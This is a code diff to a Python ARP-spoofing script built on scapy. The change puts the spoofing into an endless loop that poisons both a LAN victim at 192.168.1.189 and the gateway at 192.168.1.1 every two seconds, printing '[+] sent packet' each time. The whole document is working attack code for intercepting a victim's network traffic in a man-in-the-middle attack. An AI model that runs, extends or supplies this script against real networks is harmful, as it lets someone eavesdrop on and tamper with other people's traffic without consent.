@@ -1,4 +1,5 @@
 import scapy.all as scapy
+import time
 
 
 def get_mac(ip):
@@ -17,5 +18,8 @@ def spoof(target_ip , spoof_ip):
     scapy.send(packet)
 
 
-spoof("192.168.1.10", "192.168.1.1") #tell route (vimtc) tell vimtc (route)
-spoof("192.168.1.1", "192.168.1.10") #tell tell vimtc (route) route (vimtc) 
+while True:
+    spoof("192.168.1.189", "192.168.1.1") 
+    spoof("192.168.1.1", "192.168.1.189") 
+    print("[+] sent packet")
+    time.sleep(2)
